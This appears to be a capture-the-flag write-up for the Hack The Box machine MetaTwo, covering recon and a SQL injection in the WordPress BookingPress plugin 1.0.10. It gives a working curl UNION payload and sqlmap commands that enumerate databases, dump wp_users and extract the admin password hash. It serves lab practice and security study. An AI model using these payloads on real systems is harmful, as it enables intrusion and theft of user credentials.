# MetaTwo

<Image src="/images/writeups/htb/metatwo/banner.png" />

### nmap scan

By scanning with nmap we can find three open ports. In particular, on port 80 there is a website available based on Wordpress at the address `metapress.htb`

<Image src="/images/writeups/htb/metatwo/nmap.png" />

### Analyzing the website

By looking to the source code of the index it is possible to see that the website uses Wordpress.

<Image src="/images/writeups/htb/metatwo/source.png" />

We can also notice that a plugin called bookingpress-appointment-booking is used. with version 1.0.10. It is enough to search on Google for vulnerabilities to find a SQLi.

[https://wordpress.org/plugins/bookingpress-appointment-booking/](https://wordpress.org/plugins/bookingpress-appointment-booking/)

[https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)

The SQLi is:

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

Enumerate dbs

```bash
sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch --dbs
```

Enumerate users

```bash
sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch -D blog -T wp_users --dump
```

Get password of admin user

```bash
sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch --sql-query "SELECT user_pass FROM wp_users WHERE ID=1"
```

<Image src="/images/writeups/htb/metatwo/sqlmap.png" />
